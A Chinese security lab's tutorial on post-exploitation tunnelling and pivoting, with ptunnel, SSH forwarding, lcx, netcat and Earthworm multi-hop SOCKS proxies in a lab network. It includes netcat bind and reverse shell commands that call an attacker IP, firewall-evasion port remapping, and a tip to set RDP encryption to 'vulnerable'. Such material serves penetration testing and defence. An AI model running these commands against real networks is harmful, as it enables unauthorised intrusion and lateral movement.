> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/3jz8fjWwnzuHzho5oP0tqQ)

![](https://mmbiz.qpic.cn/mmbiz_png/SE49V9dKJrynhicSC9oWDibJEW3BUhEIWManZGCkeyNxMv9pQzctc5ZF2mlFAnYQegWvg559w1Gw4nJndYHQaJUg/640?wx_fmt=png)

戟星安全实验室

    忆享科技旗下高端的网络安全攻防服务团队. 安服内容包括渗透测试、代码审计、应急响应、漏洞研究、威胁情报、安全运维、攻防演练等

  

本文约 6000 字，阅读约需 15 分钟。

  

===

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/JrJ2TS6umMrjv2Zxp3lJsxsLV733HYpzNtwTIpJR3siaI9aQicnpcDxSYanPzoFWG7Aia5vLia494A2KJicZA0N9Iuw/640?wx_fmt=png)

0x00 前言

在实际环境中，会有各种网络设备、防火墙以及入侵检测系统阻止外网与内网的通信，我们构建内网隐蔽通道来突破安全策略的限制，实现对目标机器的控制。当我们在外网成功 getshell 之后，可以通过端口转发、内网穿透等方式进一步入侵内网，当我们取得内网机器时可以通过隧道来绕过防火墙等。

  

---

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/JrJ2TS6umMrjv2Zxp3lJsxsLV733HYpzNtwTIpJR3siaI9aQicnpcDxSYanPzoFWG7Aia5vLia494A2KJicZA0N9Iuw/640?wx_fmt=png)

0x01 ICMP 隧道搭建

PingTunnel

建立 ICMP 隧道，将 TCP/UDP 数据封装到 ICMP 的 ping 数据包中，从而穿过防火墙 (防火墙一般不会屏蔽 ping 的数据包)。

#### **拓扑：**

192.168.111.129（攻击机）—>192.168.111.132/10.10.10.129（跳板机）—>10.10.10.10（目标）

当我们拿到 web 服务器权限准备内网时，就可以搭建隧道，这里跳板机充当 web 服务器。

#### **环境配置：**

```
192.168.111.129（攻击机kali，与本机同一网段）
192.168.111.132/10.10.10.10（跳板机centos7）
10.10.10.10（目标）
```

#### **操作步骤：**

跳板机 centos7 操作：

```
ptunnel -x zzz
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/SE49V9dKJrxqLtIfiaxvuylibGMdSiabE8mZPPasjdrrm9mAKhk1TxnHOpxwJglPXzbmPm9OOZ51QzK7QLTXZ9nAA/640?wx_fmt=png)

pingtunnel 在 kali 上已经集成好了，直接使用就可以：

```
ptunnel -p 192.168.111.20 -lp 6666 -da 10.10.10.20 -dp 3389 -x zzz
```

```
-p 指定ICMP隧道另一端的IP
-lp：指定本地监听的端口
-da：指定要转发的目标机器的IP
-dp：指定要转发的目标机器的端口
-x：指定连接密码
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/SE49V9dKJrxqLtIfiaxvuylibGMdSiabE8mA5g0N9XOb6NuCCBZd7ia6dQqROHlVb2XcVGIZzrf5rKibmuxo3nQzfbg/640?wx_fmt=png)

隧道已经搭建，我们在 kali 上直接 rdp 连接自身的 ip 和 8888 端口其实就是连接目标的 3389 了

这里用跟 kali 同网段的本机测试

![图片](https://mmbiz.qpic.cn/mmbiz_png/SE49V9dKJrxqLtIfiaxvuylibGMdSiabE8mSM2ggVT8wa5iaYULOHibermjOiaNC2eFfaUVITJRB7ICbjHGUxxrFBcEQ/640?wx_fmt=png)

成功连接

![图片](https://mmbiz.qpic.cn/mmbiz_png/SE49V9dKJrxqLtIfiaxvuylibGMdSiabE8mK42vBQPyG48lntGazrGERD6CBmrGN6ibeFtb0icjNYicbrTGk74DLia2cA/640?wx_fmt=png)

这里本机 rdp 证书可能会出现问题，如果报 “出现身份验证错误, 要求的函数不支持” 错误的话，需要去策略编辑器修改

”gpedit.msc“调出本地组策略编辑器

找到 “管理模板”-“系统 “-” 凭证分配”-“加密数据库修正”，启用并将保护级别选择 “易受攻击”

最后如果是 Linux 机器可以尝试 22 端口，windows 则为演示的 3389 端口

  

---

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/JrJ2TS6umMrjv2Zxp3lJsxsLV733HYpzNtwTIpJR3siaI9aQicnpcDxSYanPzoFWG7Aia5vLia494A2KJicZA0N9Iuw/640?wx_fmt=png)

0x02 SSH 隧道

一般情况下，SSH 协议是允许通过防火墙和边界设备的，而且 SSH 协议的传输过程是加密的，所以很难区分合法的 SSH 会话和攻击者利用其他网络建立的隧道。我们使用 SSH 端口隧道突破防火墙后可以建立一些之前无法建立的 TCP 连接。

##### 参数：

```
-C：压缩传输，提高传输速度
-f：将SSH传输转入后台执行，不占用当前的Shell
-N：建立静默连接(建立了连接，但是看不到具体会话)
-g：允许远程主机连接本地用于转发的端口
-L：本地端口转发
-R：远程端口转发
-D：动态转发(SOCKS代理)
-P：指定SSH端口
```

#### **环境搭建：**

```
攻击机kali：192.168.111.129
跳板机centos7：192.168.111.131/10.10.10.129
目标机pc：10.10.10.201
```

##### **本地转发：**

以 centos7 为跳板，将内网主机的 3389 端口映射到攻击机的 6666 端口，此时访问攻击机的 6666 端口，就可以访问内网主机的 3389 端口了

操作步骤：

在攻击机上操作

```
ssh -CfNg -L 攻击机端口 : 目标ip : 目标端口 root@192.168.111.131(跳板机)
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/SE49V9dKJrxqLtIfiaxvuylibGMdSiabE8mIjoW9E3km2l2DwDTa39BEtiaiaSmZSabfSEtkNz7CCqENlBX9fPHQXag/640?wx_fmt=png)

![图片](https://mmbiz.qpic.cn/mmbiz_png/SE49V9dKJrxqLtIfiaxvuylibGMdSiabE8m6WexzicL38ceRI8GVmNTiaWjjM3zj5c7U3kK8IkrQ2KVB7w6IeSn1RyQ/640?wx_fmt=png)

![图片](https://mmbiz.qpic.cn/mmbiz_png/SE49V9dKJrxqLtIfiaxvuylibGMdSiabE8m2hK69ysppWfqbTiaQ63b4r257EpcZuvSYCfFiccJ5PpqD607dia3YMauw/640?wx_fmt=png)

##### **远程转发：**

以 centos7 为跳板，将攻击机的 5555 端口的流量转发到内网主机的 3389 端口，然后访问攻击机的 5555 端口，就可以访问内网主机的 3389 端口了

操作步骤：

在跳板机上操作

```
ssh -CfNg -R 5555(攻击机端口):目标ip:3389(目标端口) root@192.168.111.129(攻击机ip)
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/SE49V9dKJrxqLtIfiaxvuylibGMdSiabE8mXiaFEiby5MLmV56uSEce9s3KWXJfUQ6xQYsVk1xxSmVyI41aHtialWdZw/640?wx_fmt=png)

![图片](https://mmbiz.qpic.cn/mmbiz_png/SE49V9dKJrxqLtIfiaxvuylibGMdSiabE8mzswib3qm8hObP4e8fybMl46qiaIRCEibNONZPyicx7KicrJULW5lWJic1xNA/640?wx_fmt=png)

![图片](https://mmbiz.qpic.cn/mmbiz_png/SE49V9dKJrxqLtIfiaxvuylibGMdSiabE8m1fqXrdFcich4Q2CXo3Al8TquL7jVicwAibAzMC1QDPF5KpcY2nXcoy2kw/640?wx_fmt=png)

  

---

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/JrJ2TS6umMrjv2Zxp3lJsxsLV733HYpzNtwTIpJR3siaI9aQicnpcDxSYanPzoFWG7Aia5vLia494A2KJicZA0N9Iuw/640?wx_fmt=png)

0x03 LCX 端口转发

lcx 是一个基于 Socket 套接字实现的端口转发工具，有 Windows 和 Linux 两个版本。Windows 版为 lcx.exe, Linux 版为 portmap。一个正常的 Socket 隧道必须具备两端：一端为服务端，监听一个端口，等待客户端的连接；另一端为客户端；通过传人服务端的 IP 地址和端口，才能主动与服务器连接。

工具下载地址

```
https://github.com/Brucetg/Pentest-tools/tree/master/
```

#### **环境搭建：**

```
192.168.111.201（目标机器）
192.168.111.80（攻击机）
```

### **内网端口转发：**

#### 执行方法：

目标机器执行：

```
lcx.exe -slave 攻击机IP地址 9999 127.0.0.1 3389
```

VPS 执行:

```
lcx.exe -listen 9999 10000
```

完成后，在本机上远程连接攻击机的 10000 端口或是在攻击机本地远程连接 127.0.0.1 的 10000 端口即可远程连接到目标机器

#### 操作步骤：

目标机器执行：

![图片](https://mmbiz.qpic.cn/mmbiz_png/SE49V9dKJrxqLtIfiaxvuylibGMdSiabE8m1NeiaFl8hZkq8Gic4J7FannjMjIz1r5p0hqQ2hVNNnfDwc5nzpelQzMg/640?wx_fmt=png)

攻击机执行:

![图片](https://mmbiz.qpic.cn/mmbiz_png/SE49V9dKJrxqLtIfiaxvuylibGMdSiabE8mSSA26PledTce8ia8zwsn7Hkriagt5E5f9q81ibxbXPUtvYZibzkw6h2ldw/640?wx_fmt=png)

完成后我们在本机 rdp 攻击机 + 端口或攻击机 rdp 自身 + 端口就可以远程连接到目标机器了

![图片](https://mmbiz.qpic.cn/mmbiz_png/SE49V9dKJrxqLtIfiaxvuylibGMdSiabE8mjovALAmX5DicneYHpa1nm9qiaPniajX9hfyqFWjU194lGxLtehal584ibw/640?wx_fmt=png)

![图片](https://mmbiz.qpic.cn/mmbiz_png/SE49V9dKJrxqLtIfiaxvuylibGMdSiabE8m4SiarxjicuDh7qKRn29UuoXrQoNhcG9JtdQCK87Yo6FRKIINthsDHZicA/640?wx_fmt=png)

### **本地端口映射：**

如果目标防火墙不允许 3389 通过，那么我们可以将目标的相应端口转发到可以通过防火墙的端口，比如 53 端口，然后直接远程 53 端口就可以连接到目标机器

#### 执行方法：

目标机器执行:

```
lcx -tran 53 目标IP地址 3389
```

#### 操作步骤：

目标机器执行:

![图片](https://mmbiz.qpic.cn/mmbiz_png/SE49V9dKJrxqLtIfiaxvuylibGMdSiabE8mHWEXHqh6agofmHX5nIJXB9CGv8fBWYlXAuG16QiaV09fuR9VsVRTUGg/640?wx_fmt=png)

然后本机直接远程目标 53 端口即可

![图片](https://mmbiz.qpic.cn/mmbiz_png/SE49V9dKJrxqLtIfiaxvuylibGMdSiabE8mLoIwLEN25Rutz7icZfY0GHI75wfH9josuPlwzibaFJjVu59d3quXicDTw/640?wx_fmt=png)

  

---

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/JrJ2TS6umMrjv2Zxp3lJsxsLV733HYpzNtwTIpJR3siaI9aQicnpcDxSYanPzoFWG7Aia5vLia494A2KJicZA0N9Iuw/640?wx_fmt=png)

0x04 netcat

#### **使用方法：**

```
d：后台模式
e：程序重定向
g 网关：设置路由器跃程通信网关，最多可设置8个
G 指向器数目：设置源路由指向器的数量，值为4的倍数
h：帮助
i 延迟秒数 ：设置时间间隔，以便传送信息及扫描通信端口
l：使用监听模式，管理和控制传人的数据
n：直接使用IP地址(不通过域名服务器)
o 输出文件：指定文件名称，把往来传输的数据转换为十六进制字节码后保存在该文件中
p 通信端口：设置本地主机使用的通信端口
r：随机指定本地与远程主机的通信端口
s 源地址：设置本地主机送出数据包的IP地址
u：使用UDP传输协议
v：详细输出
w 超时秒数：设置等待连线的时间
z：将输人/输出功能关闭，只在扫描通信端口时使用
```

##### **端口扫描：**

```
nc -v ip port 扫指定端口
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/SE49V9dKJrxqLtIfiaxvuylibGMdSiabE8mUWIhiawL8TAYJXVGmZUBOXZrHw4KltnzNiawcaicSSnzVhU7H00G78fdA/640?wx_fmt=png)

```
nc -v -z ip port-port 扫端口段
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/SE49V9dKJrxqLtIfiaxvuylibGMdSiabE8mjepSFCyQa2PVJkB3VjgMR1LAD0H20nic5uA4D8mlD1RoO0Uh1WlBysQ/640?wx_fmt=png)

##### **文件传输：**

接收方：

```
nc -lvvp 7777
```

发送方：

```
nc -vn 192.168.111.129 7777 < 1.txt -q l
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/SE49V9dKJrxqLtIfiaxvuylibGMdSiabE8mndiawVTjk8gh5iacw1zibWBnWnCM2cFS6SxqvCRTWibFvUfLhPevHGpicLw/640?wx_fmt=png)

![图片](https://mmbiz.qpic.cn/mmbiz_png/SE49V9dKJrxqLtIfiaxvuylibGMdSiabE8mB3ESWkeMiaIx9WuiarKTRBE9ojEOm1Ase3GiaFHcyFibkNHMroQa4c4qhA/640?wx_fmt=png)

##### **聊天：**

接收方：

```
nc -lvvp 7777
```

发送方：

```
nc -vn 192.168.111.129 7777
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/SE49V9dKJrxqLtIfiaxvuylibGMdSiabE8m6ibzjqw3HMkvz0zI4rYBOhClUYefibhW9RJn2C0Wguwv4jcYru0AGgmA/640?wx_fmt=png)

![图片](https://mmbiz.qpic.cn/mmbiz_png/SE49V9dKJrxqLtIfiaxvuylibGMdSiabE8mnJTEMMIYFd3ibzMNM6KYCXUkRQLZqVZibW7vbZGeJbH8X8LX5w48q7JQ/640?wx_fmt=png)

##### **正向 shell：**

目标机器：

```
Linux：nc -lvvp 8888 -e /bin/sh
Windows：nc -lvp 4444 -e c:\windows\system32\cmd.exe
```

攻击机器：

```
nc 目标ip 8888
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/SE49V9dKJrxqLtIfiaxvuylibGMdSiabE8mfM7XHwfOm2UfVq8q763bHeJDzlcpPEib1eibL0rSy7B37Eian4XTYjQRQ/640?wx_fmt=png)

![图片](https://mmbiz.qpic.cn/mmbiz_png/SE49V9dKJrxqLtIfiaxvuylibGMdSiabE8m7o7CHWKk406EdBx5HeXz49RVicvsJX68hOVOuW97I6jr04sIkibUObGA/640?wx_fmt=png)

##### **反向 shell：**

目标机器：

```
Linux：nc 192.168.220.165 9999 -e /bin/sh
Windows：nc 192.168.220.165 9999 -e C:\windows\system32\cmd.exe
```

攻击机：

```
nc -lvp 9999
```

  

---

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/JrJ2TS6umMrjv2Zxp3lJsxsLV733HYpzNtwTIpJR3siaI9aQicnpcDxSYanPzoFWG7Aia5vLia494A2KJicZA0N9Iuw/640?wx_fmt=png)

0x05 Earthworm

EW 是一套便携式的网络穿透工具，具有 SOCKS v5 服务架设和端口转发两大核心功能，可在复杂网络环境下完成网络穿透。该工具能够以 “正向”、“反向”、“多级级联” 等方式搭建一条网络隧道。工具包中提供了多种可执行文件，以适用不同的操作系统，Linux、Windows、MacOS、Arm-Linux 均被包括其内。

下载地址：

```
https://github.com/idlefire/ew
```

#### **使用方法：**

该工具共有 6 种命令格式（ssocksd、rcsocks、rssocks、lcx_slave、lcx_listen、lcx_tran）

例如：./xxx -s ssocksd -h  
-s 指定工作模式。工作模式支持如下：  
ssocksd , rcsocks , rssocks ,lcx_listen , lcx_tran , lcx_slave  

```
ssocksd 创建正向socks代理服务端，监听在本地，直接把当前环境socks代理出去。
rssocks 创建反向socks代理服务端
rcsocks 反向socks代理客户端
lcx_tran 正向tcp端口转发，监听在本地
lcx_slave 反向tcp转发客户端
lcx_listen 反向tcp服务端
-l listenport为服务器打开一个监听端口。
-d refhost 设置反射主机地址。
-e refport 设置反射端口。
-f connhost 设置连接主机地址。
-g connport 设置连接端口。
-h help 显示帮助文本，通过添加 -s 参数，您还可以查看更详细的帮助。
-a about 显示关于页面
-v version 显示版本。
-t usectime 设置超时的毫秒数。 默认的值为 1000
```

### **正向代理：**

适用于被控主机存在公网 ip 且可以任意开启监听端口

##### 环境搭建：

```
攻击机kali：192.168.111.129
被控主机win7：192.168.111.201/10.10.10.201
内网机器2003：10.10.10.10
```

##### 操作步骤：

将 exe 传入被控主机，在被控主机开启监听端口

```
ew_for_Win.exe -s ssocksd -l 6666
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/SE49V9dKJrxqLtIfiaxvuylibGMdSiabE8mFH43wNicvo3zhybZMRcZFodWyjZRkfoGfxjSbn7DUnZ8DooJ1gziaRgw/640?wx_fmt=png)

在 kali 使用 proxifier 工具连接 ew

配置文件—代理服务器—添加

填入被控主机 ip 和监听端口，选择 socks5

![图片](https://mmbiz.qpic.cn/mmbiz_png/SE49V9dKJrxqLtIfiaxvuylibGMdSiabE8mjSOEvlkib6vkB0HSYKv4IwztxZzibowAAW5xO2424ibficEwApzhhfyYIw/640?wx_fmt=png)

然后就可以 rdp 内网机器了

![图片](https://mmbiz.qpic.cn/mmbiz_png/SE49V9dKJrxqLtIfiaxvuylibGMdSiabE8m8HiclAicu2zmSEYDJmzbNAzfgRRyCFDxc3dqLebehSNypvmtv7yQ9tJQ/640?wx_fmt=png)

### **反向代理：**

目标网络边界不存在公网 IP，能够访问内网资源，可以访问公网，需要通过反弹方式创建 socks 代理

##### 环境搭建：

```
攻击机kali：192.168.111.129
被控主机win7：192.168.111.201/10.10.10.201
内网机器2003：10.10.10.10
```

##### 操作步骤：

在 vps 上添加隧道，将 6666 收到的代理请求转发到反向连接 8888 端口的被控机器

```
./ew_for_linux64 -s rcsocks -l 6666 -e 8888
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/SE49V9dKJrxqLtIfiaxvuylibGMdSiabE8mSe1bZRwLrnhEyicZ4FkGd6rGkJ4fBfWvIFh7UBlyfEQRZsfce0r2v3g/640?wx_fmt=png)

被控机器执行

```
ew_for_Win.exe -s rssocks -d 192.168.111.129 -e 8888
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/SE49V9dKJrxqLtIfiaxvuylibGMdSiabE8mXPbRCOH4R4c2AwSx94hoW3XiaGVB41l8r9gJiajOHSEjO7ic4O5hib7pQQ/640?wx_fmt=png)

当 vps 出现下图时说明成功

![图片](https://mmbiz.qpic.cn/mmbiz_png/SE49V9dKJrxqLtIfiaxvuylibGMdSiabE8mDKp6k2pdSBiaNuA0HYCWT4CtIichFiaP5Xkicu04JJ7uPqMWhsm7wEibBxw/640?wx_fmt=png)

再使用 proxifier 连接 vps 监听的端口

配置文件—代理服务器—添加

填入 vps ip 和监听端口，选择 socks5

![图片](https://mmbiz.qpic.cn/mmbiz_png/SE49V9dKJrxqLtIfiaxvuylibGMdSiabE8mfFIqV5Q2K4CXYr9vphujgbibpyjibniaP6QkGmewbCe2xKKSy1ugAVkwA/640?wx_fmt=png)

然后就可以 rdp 内网机器了

![图片](https://mmbiz.qpic.cn/mmbiz_png/SE49V9dKJrxqLtIfiaxvuylibGMdSiabE8mlkHYl2C74LANWojJYGEHNPcYY398ALM2A9FHN6lrKWmibfELxIrUZ3g/640?wx_fmt=png)

### **二级代理（一）：**

在获得边界服务器 **被控机器 1** 的 shell 后，通过横向到**内网** **1** 中的 **被控机器 2** ，发现 **被控机器 2** 同时还存在另一个**内网** **2**，但 **被控机器 2** 所处的**内网** **2** 无法访问公网，公网也无法访问 **被控机器 2** 所在**内网** **2** ，但是 **被控机器 2** 可以单向访问 **被控机器 1** ，这时需要把 **被控机器 2** 所在的**内网** **2** 的流量代理出来。

##### 环境搭建：

```
攻击机（本机）：192.168.111.1
vps（kali）：192.168.111.129
被控主机1（win7）：192.168.111.134/10.10.10.200
被控主机2（win7PC）：192.168.48.129/10.10.10.201
内网主机（2003）：192.168.48.128
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/SE49V9dKJrxqLtIfiaxvuylibGMdSiabE8mPrsKpbhSVg7CwMhr2UFOQ4aUjCDOvhRYf0REcQk3ub7cklzoTa8xRQ/640?wx_fmt=png)

##### 操作步骤：

在 VPS（kali）上添加隧道，通过 **ew** 的 **lcx_listen** 模块监听本机 6666 端口，将 6666 端口收到的代理请求转发到反连 8888 端口的主机：

```
ew_for_Win.exe -s lcx_listen -l 6666 -e 8888
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/SE49V9dKJrxqLtIfiaxvuylibGMdSiabE8mw8ianibfrLiacmLAFtSfpV53um7XcezYQVbxwLO9dXRNmFeTRU5V1aiawQ/640?wx_fmt=png)

在**被控机器** **1** 上启动监听本机端口 9999，并将 9999 端口接收到的代理流量，转发给 vps 的 8888 端口：

```
ew_for_Win.exe -s lcx_tran -l 被控主机1本机端口 -f 攻击者的公网vps_IP -g 8888 
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/SE49V9dKJrxqLtIfiaxvuylibGMdSiabE8mt8OiaVGU2OMictunTRiaMt9DTDib5cOWJV7Pq1jx64xuKpOJXzkL37Ejeg/640?wx_fmt=png)

在被控机器 2 启动 SOCKS v5 代理服务端，并反弹到被控机器 1 的 8888 端口 ：

```
ew_for_Win.exe -s rssocks -d 10.10.10.200 -e 9999
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/SE49V9dKJrxqLtIfiaxvuylibGMdSiabE8mgicjWnXossxicZDIBTO4PQ2cHQ8ptrLwib2SibFpfq085NsyjfbXOlNSmA/640?wx_fmt=png)

再使用 proxifier 连接 vps 监听的端口

配置文件—代理服务器—添加

填入 vps ip 和监听端口，选择 socks5

![图片](https://mmbiz.qpic.cn/mmbiz_png/SE49V9dKJrxqLtIfiaxvuylibGMdSiabE8mfwIEMYutlmkJ7hibNu4rgFBYyvPrdolHofriaiby89ARDiaG55oIy4nzLA/640?wx_fmt=png)

然后就可以 rdp 内网机器了

![图片](https://mmbiz.qpic.cn/mmbiz_png/SE49V9dKJrxqLtIfiaxvuylibGMdSiabE8mx85y0pK19aKXscLE1KyUvNQJbmMAeePY9FOZqv8A03xPgMIOpIiaiakg/640?wx_fmt=png)

### **二级代理（二）：**

在获得边界服务器**被控机器** **1** 的 webshell 后，发现**被控机器** **1** 没有公网 IP，但处于边界的**被控机器** **1** 可访问公网；攻击者通过横向移动到**内网** **1** 中的**被控机器** **2**，发现**被控机器** **2** 同时处于另一个**内网** **2** 中，但**被控机器** **2** 所处的**内网** **2** 无法访问公网，公网也无法访问**被控机器** **2** 所在**内网** **2** ，但处于边界的**被控主机** **1** 却可以单向访问**被控机器** **2** 所处的**内网** **2**，这时需要把**被控机器** **2** 所在的**内网** **2** 的流量代理出来。

##### 环境搭建：

```
攻击机（本机）：192.168.111.1
vps（kali）：192.168.111.129
被控主机1（win7）：192.168.111.134/10.10.10.200
被控主机2（win7PC）：192.168.48.129/10.10.10.201
内网主机（2003）：192.168.48.128
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/SE49V9dKJrxqLtIfiaxvuylibGMdSiabE8mulkm1fhlRLJWujzjj6famtC0NhSl7iaBRkSsvP12fJvjq3amTe42ERA/640?wx_fmt=png)

##### 操作步骤：

在 **vps** 添加转接隧道，通过 **ew** 的 **lcx_listen** 模块监听本机的 6666 端口，把 6666 端口接受到的代理请求，转发到反连 8888 端口的主机：

```
ew_for_Win.exe -s lcx_listen -l 6666 -e 8888
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/SE49V9dKJrxqLtIfiaxvuylibGMdSiabE8moATY5GIo0oUib7XRzvX5dIibZAmlKibOx98ozVibUCIu7gKM9I56fJtg7w/640?wx_fmt=png)

在**内网** **2** 中的**被控机器** **2** 上通过 **ssocksd** 模块，开启正向代理服务，通过 **ssocksd** 模块监听**被控机器** **2** 的 9999 端口，通过正向代理，把外流量引向内网：

```
ew_for_Win.exe -s ssocksd -l 9999
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/SE49V9dKJrxqLtIfiaxvuylibGMdSiabE8mbia4l3Zq7DbOrhpJjZXQav9UVlKUUGafc14OQkpQgYIAibiclDrGJs25g/640?wx_fmt=png)

在**内网** **1** 中的**被控机器** **1** 运行以下命令，通过 ew 的 **lcx_slave** 流量转发模块，将正向连接到 **vps** 的 8888 端口，而获得的代理请求流量，转发给**内网** **2** 的**被控机器** **2**，从而获得**内网** **2** 的内网流量：

```
ew_for_Win.exe -s lcx_slave -d 攻击者的公网vps_IP -e 8888 -f 处于2级内网的被控主机 -g 9999
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/SE49V9dKJrxqLtIfiaxvuylibGMdSiabE8mM2hECErdficma38aUxkH9CjxmC6nNz2CpAfQ2R0RbKcrvJBKrAmGJiaw/640?wx_fmt=png)

再使用 proxifier 连接 vps 监听的端口

配置文件—代理服务器—添加

填入 vps ip 和监听端口，选择 socks5

![图片](https://mmbiz.qpic.cn/mmbiz_png/SE49V9dKJrxqLtIfiaxvuylibGMdSiabE8mfwIEMYutlmkJ7hibNu4rgFBYyvPrdolHofriaiby89ARDiaG55oIy4nzLA/640?wx_fmt=png)

然后就可以 rdp 内网机器了

![图片](https://mmbiz.qpic.cn/mmbiz_png/SE49V9dKJrxqLtIfiaxvuylibGMdSiabE8mSHbhnbIc4HwhTpKY5IJtZ7K133RfmOyegzOqmNyMCZiabUZDocxqtmg/640?wx_fmt=png)

### 三级代理：

内网主机 A 没有公网 IP ，但是可以访问外网，内网主机 B 不能访问外网，但是可以和 A 相互访问，内网主机 C 能访问内网资源，但是只能和 B 相互访问，我们如果想访问内网资源就需要做三层代理。

vps—> 内网主机 A—> 内网主机 B—> 内网主机 C

##### 操作步骤：

在公网 VPS 上，将 1080 端口收到的代理请求转发到 4444 端口

```
ew_for_linux64 -s rcsocks -l 1080 -e 4444
```

在内网主机 A 上，将 VPS 的 4444 端口和内网主机 B 的 5555 端口连接起来

```
./ew_for_linux64 -s lcx_slave -d 172.16.214.1 -e 4444 -f
192.168.7.110 -g 5555
```

在内网主机 B 上，将 5555 端口收到的代理请求转发到 6666 端口上

```
.\ew_for_Win.exe -s lcx_listen -l 5555 -e 6666
```

在内网主机 C 上，启动 socks5 服务，并反弹到 B 主机的 6666 端口上

```
.\ew_for_Win.exe -s rssocks -d 192.168.7.110 -e 6666
```

之后访问 VPS 的 1080 端口就可以访问到内网资源了

 声明

    由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，戟星安全实验室及文章作者不为此承担任何责任。

    戟星安全实验室拥有对此文章的修改和解释权。如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经戟星安全实验室允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的。

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/SE49V9dKJrynhicSC9oWDibJEW3BUhEIWMV4H85J4YckN52SrMs6g39J9hFmm1gicqv7aoxqzzueEib840W2oUlFXg/640?wx_fmt=jpeg)

戟星安全实验室

# 长按二维码 关注我们 #